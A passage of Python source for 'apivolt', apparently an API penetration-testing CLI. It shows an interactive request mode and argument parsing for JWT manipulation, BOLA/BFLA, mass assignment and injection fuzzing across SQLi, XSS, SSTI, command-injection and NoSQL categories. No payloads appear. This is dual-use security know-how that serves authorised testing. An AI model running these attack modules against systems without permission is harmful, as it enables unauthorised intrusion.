            f"{Colors.BOLD}[B]{Colors.END}ody")
        self._pr(
            f"  {Colors.BOLD}[J]{Colors.END}WT attacks  "
            f"{Colors.BOLD}[F]{Colors.END}uzz  "
            f"{Colors.BOLD}[C]{Colors.END}ontent-Type  "
            f"{Colors.BOLD}[A]{Colors.END}uth matrix  "
            f"{Colors.BOLD}[N]{Colors.END}ew endpoint  "
            f"{Colors.BOLD}[Q]{Colors.END}uit")
        self._pr(f"  {Colors.DIM}auth:[{self.auth_mode}]{Colors.END}  > ", end='')
        sys.stdout.flush()
        ch = self._getch().upper()
        self._pr(ch)
        return ch if ch in 'RESHBAJFCNQ' else None

    # ------------------------------------------------------------------
    # Auth switcher
    # ------------------------------------------------------------------
    def _switch_auth(self):
        modes = ['primary', 'none']
        if self.engine.jwt_secondary:
            modes.insert(1, 'secondary')
        if self.engine.api_key:
            modes.append('apikey')
        if self.engine.cookie_auth:
            modes.append('cookie')

        self._pr(f"\n  Available auth modes:")
        for i, m in enumerate(modes, 1):
            mark = '▶' if m == self.auth_mode else ' '
            self._pr(f"    {mark} [{i}] {m}")
        raw = self._read_line(f"  Select [1-{len(modes)}]: ", default='')
        try:
            idx = int(raw.strip()) - 1
            if 0 <= idx < len(modes):
                self.auth_mode = modes[idx]
                self._pr(f"  {Colors.GREEN}→ auth: {self.auth_mode}{Colors.END}")
        except (ValueError, IndexError):
            pass

    # ------------------------------------------------------------------
    # Inline test runners
    # ------------------------------------------------------------------
    def _scope_to(self, ep):
        """Context manager to temporarily restrict engine.endpoints to one ep."""
        return _ScopeContext(self.engine, ep)

    def _run_jwt(self, ep):
        self._pr(f"\n{Colors.MAGENTA}{'='*60}\n{self._log_prefix} JWT attacks: "
                 f"{ep['method']} {ep['path']}\n{'='*60}{Colors.END}")
        with self._scope_to(ep):
            self.engine.test_jwt()

    def _run_fuzz(self, ep):
        self._pr(f"\n{Colors.MAGENTA}{'='*60}\n{self._log_prefix} Fuzzing: "
                 f"{ep['method']} {ep['path']}\n{'='*60}{Colors.END}")
        with self._scope_to(ep):
            self.engine.fuzz_endpoints()

    def _run_ctype(self, ep):
        self._pr(f"\n{Colors.MAGENTA}{'='*60}\n{self._log_prefix} Content-Type: "
                 f"{ep['method']} {ep['path']}\n{'='*60}{Colors.END}")
        with self._scope_to(ep):
            self.engine.test_content_type()

    def _run_auth_matrix(self, ep):
        self._pr(f"\n{Colors.MAGENTA}Auth matrix: {ep['method']} {ep['path']}{Colors.END}")
        r_auth   = self.engine.send_request(ep, auth_mode='primary')
        r_noauth = self.engine.send_request(ep, auth_mode='none')
        self._pr(f"\n  {Colors.BOLD}── Authenticated ──{Colors.END}")
        if r_auth:   self._render_response(r_auth, auth_label='auth')
        self._pr(f"\n  {Colors.BOLD}── Unauthenticated ──{Colors.END}")
        if r_noauth: self._render_response(r_noauth, auth_label='noauth')
        if r_auth and r_noauth:
            s = r_noauth.status_code
            if 200 <= s < 300 and ep['security']:
                self._pr(f"\n  {Colors.FAIL}⚠  Accessible without auth! ({s}){Colors.END}")
            else:
                self._pr(f"\n  {Colors.GREEN}✓  Properly rejected ({s}){Colors.END}")

    # ------------------------------------------------------------------
    # Main session loop
    # ------------------------------------------------------------------
    def run(self):
        self._pr(self.HIDE_CURSOR, end='')
        try:
            self._loop()
        except KeyboardInterrupt:
            pass
        finally:
            self._pr(self.SHOW_CURSOR, end='')
            self._pr()

    def _loop(self):
        while True:
            ep = self.pick_endpoint()
            if ep is None:
                break

            current_ep = ep
            last_resp  = None
            do_resend  = True

            while True:
                # ── Send (or skip if we just toggled a view) ──────────────
                if do_resend:
                    self._clear()
                    self._pr(
                        f"{Colors.BOLD}⚡ {current_ep['method']} "
                        f"{current_ep['path']}{Colors.END}  "
                        f"{Colors.DIM}[{self.auth_mode}]{Colors.END}")
                    if current_ep['summary']:
                        self._pr(f"  {Colors.DIM}{current_ep['summary']}{Colors.END}")
                    self._pr(self._hr())

                    # Curl preview
                    kw = self.engine._build_request(current_ep, auth_mode=self.auth_mode)
                    self._pr(f"  {Colors.DIM}→ {kw['method']} {kw['url']}{Colors.END}")
                    for k, v in list((kw.get('headers') or {}).items())[:3]:
                        if k.lower() != 'content-type':
                            self._pr(f"    {Colors.DIM}{k}: {str(v)[:70]}{Colors.END}")

                    self.engine.logger.debug(
                        f"{self._log_prefix} {current_ep['method']} "
                        f"{kw['url']} auth={self.auth_mode}")
                    last_resp = self.engine.send_request(
                        current_ep, auth_mode=self.auth_mode)

                    if last_resp:
                        self._render_response(last_resp)
                    else:
                        self._pr(f"  {Colors.FAIL}No response (connection error){Colors.END}")
                    do_resend = False

                # ── Sub-menu ──────────────────────────────────────────────
                action = self._draw_menu()
                if action is None:
                    continue

                if action == 'R':
                    do_resend = True

                elif action == 'E':
                    current_ep = self._edit_endpoint(current_ep)
                    do_resend = True

                elif action == 'S':
                    self._switch_auth()

                elif action == 'H':
                    self.show_headers = not self.show_headers
                    if last_resp:
                        self._render_response(last_resp)

                elif action == 'B':
                    self.show_full_body = not self.show_full_body
                    if last_resp:
                        self._render_response(last_resp)

                elif action == 'J':
                    self._run_jwt(current_ep)
                    if self.engine.findings:
                        self.engine.print_findings_report()
                    input(f"  {Colors.DIM}Press Enter to continue…{Colors.END}")
                    if last_resp:
                        self._render_response(last_resp)

                elif action == 'F':
                    self._run_fuzz(current_ep)
                    if self.engine.findings:
                        self.engine.print_findings_report()
                    input(f"  {Colors.DIM}Press Enter to continue…{Colors.END}")
                    if last_resp:
                        self._render_response(last_resp)

                elif action == 'C':
                    self._run_ctype(current_ep)
                    if self.engine.findings:
                        self.engine.print_findings_report()
                    input(f"  {Colors.DIM}Press Enter to continue…{Colors.END}")
                    if last_resp:
                        self._render_response(last_resp)

                elif action == 'A':
                    self._run_auth_matrix(current_ep)
                    input(f"  {Colors.DIM}Press Enter to continue…{Colors.END}")
                    if last_resp:
                        self._render_response(last_resp)

                elif action == 'N':
                    break   # back to endpoint picker

                elif action == 'Q':
                    return  # exit interactive mode


class _ScopeContext:
    """Temporarily restrict engine.endpoints to a single endpoint."""
    def __init__(self, engine, ep):
        self._engine = engine
        self._ep     = ep
        self._saved  = None

    def __enter__(self):
        self._saved = self._engine.endpoints
        self._engine.endpoints = [self._ep]
        return self

    def __exit__(self, *_):
        self._engine.endpoints = self._saved


# ===================================================================
# CLI Entry Point
# ===================================================================
def _run_modules(engine, modules):
    """Run selected test modules under a live scan panel (agentmap-style).

    The engine's verbose per-finding logging is quieted to WARNING while the
    panel is live, then restored, so the panel stays clean. Findings still
    accumulate on the engine exactly as before.
    """
    header = (f"[bold #ffcc00]{BOLT}[/] [bold]apivolt[/]  "
              f"[grey50]scanning[/] {engine.base_url or '(no base url)'}  "
              f"[{_ACCENT}]{len(engine.endpoints)}[/] endpoints")
    if not _HAS_RICH:
        for _label, fn in modules:
            fn()
        return
    ui = ScanUI(header)
    prev_level = engine.logger.level
    started = time.time()
    ui.start()
    try:
        engine.logger.setLevel(logging.WARNING)
        for label, fn in modules:
            ui.set_running(label)
            before = len(engine.findings)
            t0 = time.time()
            try:
                fn()
            except Exception as e:  # a module must not crash the whole run
                engine.logger.warning(f"{label} error: {e}")
            ui.set_done(len(engine.findings) - before, time.time() - t0)
    finally:
        engine.logger.setLevel(prev_level)
        ui.finish(engine.findings, time.time() - started)


def main():
    parser = argparse.ArgumentParser(
        prog='apivolt',
        description=f'⚡ {TOOL_NAME} v{__version__} - Comprehensive API Security Testing Suite',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
Examples:
  # Point at a live target: auto-discovers /openapi.json, /swagger.json, etc.
  %(prog)s http://127.0.0.1:8000 --endpoints
  %(prog)s http://127.0.0.1:8000 --endpoints | grep POST
  %(prog)s http://127.0.0.1:8000 --list
  %(prog)s http://127.0.0.1:8000 --jwt <token> --test-all

  # Direct URL to a known spec endpoint
  %(prog)s http://127.0.0.1:8000/swagger.json --endpoints

  # Local file (requires --base-url for scanning)
  %(prog)s spec.yaml --endpoints
  %(prog)s spec.yaml -b https://api.example.com --list
  %(prog)s spec.yaml -b https://api.example.com --jwt <token> --test-all

  # Postman collection
  %(prog)s collection.json --from-postman --endpoints
  %(prog)s collection.json -b https://api.example.com --from-postman --test-unauth

  # Convert Postman → OpenAPI
  %(prog)s collection.json --from-postman --to-openapi api_spec.yaml

  # Full pentest suite
  %(prog)s http://example.com:3000 --jwt <token> \\
      --jwt-secondary <user2> --test-all \\
      --report-json findings.json --proxy
        ''')

    parser.add_argument(
        'target',
        help=(
            'Primary input: live target URL (http://host:port) auto-discovers the spec. '
            'Also accepts a direct spec URL (http://host/openapi.json) or, '
            'as a fallback when the spec is not exposed, a local file (spec.yaml).'
        ),
    )
    parser.add_argument(
        '--base-url', '-b', default='',
        help='Base URL for sending requests. Auto-inferred from a target URL; '
             'required when the target is a local file with no servers[] in the spec.',
    )
    parser.add_argument('--version', '-V', action='version', version=f'{TOOL_NAME} {__version__}')

    # Input format
    fmt_group = parser.add_argument_group('Input Format')
    fmt_group.add_argument('--from-postman', action='store_true',
                           help='Treat input as Postman collection v2.1 (auto-converts to OpenAPI)')

    # Conversion
    conv_group = parser.add_argument_group('Conversion')
    conv_group.add_argument('--to-openapi', metavar='FILE',
                            help='Convert Postman → OpenAPI spec (YAML). Requires --from-postman')
    conv_group.add_argument('--to-openapi-json', metavar='FILE',
                            help='Convert Postman → OpenAPI spec (JSON). Requires --from-postman')

    # Auth
    auth_group = parser.add_argument_group('Authentication')
    auth_group.add_argument('--jwt', '-j', help='JWT Bearer token (primary user)')
    auth_group.add_argument('--jwt-secondary', help='Second JWT (for BOLA/BFLA)')
    auth_group.add_argument('--api-key', help='API key value')
    auth_group.add_argument('--api-key-header', default='X-API-Key', help='API key header name')
    auth_group.add_argument('--cookie-auth', help='Session cookie value')
    auth_group.add_argument('--basic-auth', help='Basic auth user:pass')

    # Connection
    conn_group = parser.add_argument_group('Connection')
    conn_group.add_argument('--proxy', '-p', action='store_true', help='Burp proxy (127.0.0.1:8080)')
    conn_group.add_argument('--proxy-url', help='Custom proxy URL')
    conn_group.add_argument('--timeout', '-t', type=int, default=30, help='Request timeout')
    conn_group.add_argument('--delay', type=float, default=0.0, help='Delay between requests (seconds)')

    # Output
    out_group = parser.add_argument_group('Output')
    out_group.add_argument('--log', '-l', help='Log file path')
    out_group.add_argument(
        '--list', action='store_true',
        help='Rich endpoint listing: method colors, auth icons, deprecated flags, summary. '
             'Human-readable. Requires full engine init.',
    )
    out_group.add_argument(
        '--endpoints', action='store_true',
        help='Bare METHOD\\tPATH output, one per line. No banner, no logging. '
             'Pipe-friendly: grep, cut, wc -l, feed to other tools. '
             'Think: curl -s .../openapi.json | jq -r .paths',
    )
    out_group.add_argument(
        '--interactive', '-i', action='store_true',
        help='Interactive mode: live-filter endpoint list, send requests, '
             'edit bodies, run inline attacks. Requires a real TTY.',
    )
    out_group.add_argument('--export', '-e', help='Export requests JSON')
    out_group.add_argument('--export-postman', '-P', help='Export Postman collection')
    out_group.add_argument('--report-json', metavar='FILE', help='Write findings as JSON')
    out_group.add_argument('--report-md', metavar='FILE', help='Write a Markdown findings report')
    out_group.add_argument('--report-html', metavar='FILE', help='Write a self-contained HTML findings report')
    out_group.add_argument('--report-all', metavar='DIR',
                           help='Write report.json, report.md and report.html into DIR')

    # Filters
    filt_group = parser.add_argument_group('Filters')
    filt_group.add_argument('--tags', nargs='+', help='Filter by tags')
    filt_group.add_argument('--methods', '-m', nargs='+', help='Filter by HTTP methods')

    # Security tests
    test_group = parser.add_argument_group('Security Tests')
    test_group.add_argument('--test-all', action='store_true', help='Run ALL test modules')
    test_group.add_argument('--test-unauth', action='store_true', help='AuthZ matrix')
    test_group.add_argument('--test-bola', action='store_true', help='BOLA/IDOR')
    test_group.add_argument('--test-bfla', action='store_true', help='BFLA')
    test_group.add_argument('--test-method', action='store_true', help='HTTP method tampering')
    test_group.add_argument('--test-mass', action='store_true', help='Mass assignment & data exposure')
    test_group.add_argument('--test-jwt', action='store_true', help='JWT manipulation')
    test_group.add_argument('--test-ctype', action='store_true', help='Content-Type confusion')
    test_group.add_argument('--test-schema', action='store_true', help='Response schema validation')
    test_group.add_argument('--test-rate', action='store_true', help='Rate limiting')
    test_group.add_argument('--test-headers', action='store_true', help='Security headers')
    test_group.add_argument('--fuzz', action='store_true', help='Injection fuzzing')
    test_group.add_argument('--fuzz-categories', nargs='+',
                            choices=['sqli', 'xss', 'ssti', 'path_traversal', 'cmdi', 'nosqli'],
                            help='Fuzz categories')
    test_group.add_argument('--rate-burst', type=int, default=20, help='Rate limit burst count')

    # Samples
    samp_group = parser.add_argument_group('Sample Overrides')
    samp_group.add_argument('--sample-string', dest='sample_string')
    samp_group.add_argument('--sample-integer', type=int)
    samp_group.add_argument('--sample-number', type=float)
    samp_group.add_argument('--sample-boolean', type=str2bool)
    samp_group.add_argument('--sample-array', type=json.loads)
    samp_group.add_argument('--sample-object', type=json.loads)

    args = parser.parse_args()

    # --endpoints: fast path, resolve spec and print METHOD\tPATH, no engine needed
    if args.endpoints:
        try:
            spec, _, _ = resolve_target(args.target, from_postman=args.from_postman)
            paths = spec.get('paths', {})
            for path in sorted(paths.keys()):
                methods_on_path = [
                    m.upper() for m in paths[path]
                    if isinstance(paths[path].get(m), dict)
                    and m.upper() in ('GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS')
                ]
                for method in methods_on_path:
                    print(f"{method}\t{path}")
        except RuntimeError as e:
            print(f"Error: {e}", file=sys.stderr)
            sys.exit(1)
        return

    # Handle Postman → OpenAPI conversion (standalone, no base_url needed)
    if args.from_postman and (args.to_openapi or args.to_openapi_json):
        print(BANNER)
        converter = PostmanToOpenAPI(args.target)
        if args.to_openapi:
            converter.export(args.to_openapi, fmt='yaml')
            print(f"{Colors.GREEN}[+] Converted Postman → OpenAPI YAML: {args.to_openapi}{Colors.END}")
        if args.to_openapi_json:
            converter.export(args.to_openapi_json, fmt='json')
            print(f"{Colors.GREEN}[+] Converted Postman → OpenAPI JSON: {args.to_openapi_json}{Colors.END}")
        return

    use_proxy = args.proxy or args.proxy_url is not None

    engine = APIvolt(
        spec_path=args.target, base_url=args.base_url,
        from_postman=args.from_postman,
        jwt=args.jwt, jwt_secondary=args.jwt_secondary,
        api_key=args.api_key, api_key_header=args.api_key_header,
        cookie_auth=args.cookie_auth, basic_auth=args.basic_auth,
        use_proxy=use_proxy, proxy_url=args.proxy_url,
        timeout=args.timeout, log_file=args.log, delay=args.delay,
        sample_string=args.sample_string, sample_integer=args.sample_integer,
        sample_number=args.sample_number, sample_boolean=args.sample_boolean,
        sample_array=args.sample_array, sample_object=args.sample_object,
    )

    # Dispatch
    if args.list:
        engine.list_endpoints()
    elif args.interactive:
        InteractiveMode(engine).run()
    elif args.export:
        engine.export_requests(args.export)
    elif args.export_postman:
        engine.export_postman(args.export_postman)
    else:
        ta = args.test_all
        any_test = ta or any([
            args.test_unauth, args.test_bola, args.test_bfla, args.test_method,
            args.test_mass, args.test_jwt, args.test_ctype, args.test_schema,
            args.test_rate, args.test_headers, args.fuzz,
        ])

        if not any_test:
            engine.run_all(tags=args.tags, methods=args.methods)
        else:
            t, m = args.tags, args.methods
            modules = []
            if ta or args.test_unauth:   modules.append(("Authorization matrix", lambda: engine.test_unauth(t, m)))
            if ta or args.test_bola:     modules.append(("BOLA / IDOR", lambda: engine.test_bola(t, m)))
            if ta or args.test_bfla:     modules.append(("BFLA", lambda: engine.test_bfla(t, m)))
            if ta or args.test_method:   modules.append(("Method tampering", lambda: engine.test_method_tampering(t, m)))
            if ta or args.test_mass:     modules.append(("Mass assignment", lambda: engine.test_mass_assignment(t, m)))
            if ta or args.test_jwt:      modules.append(("JWT manipulation", lambda: engine.test_jwt(t, m)))
            if ta or args.test_ctype:    modules.append(("Content-Type confusion", lambda: engine.test_content_type(t, m)))
            if ta or args.test_schema:   modules.append(("Schema validation", lambda: engine.test_schema_validation(t, m)))
            if ta or args.test_rate:     modules.append(("Rate limiting", lambda: engine.test_rate_limit(t, m, burst=args.rate_burst)))
            if ta or args.test_headers:  modules.append(("Security headers", lambda: engine.test_security_headers(t, m)))
            if ta or args.fuzz:          modules.append(("Injection fuzzing", lambda: engine.fuzz_endpoints(t, m, categories=args.fuzz_categories)))

            _run_modules(engine, modules)
            engine.print_findings_report()
            if args.report_json:
                engine.export_findings_json(args.report_json)
            if args.report_md:
                engine.export_report_md(args.report_md)
            if args.report_html:
                engine.export_report_html(args.report_html)
            if args.report_all:
                os.makedirs(args.report_all, exist_ok=True)
                engine.export_findings_json(os.path.join(args.report_all, 'report.json'))
                engine.export_report_md(os.path.join(args.report_all, 'report.md'))
                engine.export_report_html(os.path.join(args.report_all, 'report.html'))


if __name__ == '__main__':
    main()
